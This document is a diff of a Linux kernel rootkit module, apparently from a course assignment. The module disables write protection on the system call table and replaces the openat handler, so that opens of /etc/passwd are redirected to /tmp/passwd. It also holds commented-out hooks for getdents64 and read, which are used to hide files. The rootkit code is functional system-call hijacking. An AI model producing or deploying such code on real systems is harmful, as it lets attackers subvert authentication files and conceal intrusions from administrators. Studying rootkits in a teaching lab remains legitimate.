@@ -53,15 +53,10 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
-  // char * pathname;
-  // pathname = (char *)regs->di;
-  // if(strcmp(pathname, "/etc/passwd") == 0){
-  //   copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd"));
-  // }
-  // return (*original_openat)(regs);
-  if(strcmp((char*)(regs->si), "/etc/passwd") == 0){
-    const char* tmpPasswdPath = "/tmp/passwd";
-    copy_to_user((char*)(regs->si), tmpPasswdPath, strlen(tmpPasswdPath));
+  const char * pathname;
+  pathname = (const char *)regs->di;
+  if(strcmp(pathname, "/etc/passwd") == 0){
+    copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd"));
   }
   return (*original_openat)(regs);
 }
@@ -121,14 +116,14 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
-  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
-  original_read = (void*)sys_call_table[__NR_read];
+  //original_getdents64 = (void*)sys_call_table[__NR_getdents64];
+  //original_read = (void*)sys_call_table[__NR_read];
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  //sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
+  //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   // You need to replace other system calls you need to hack here
   
   // Turn write protection mode back on for sys_call_table
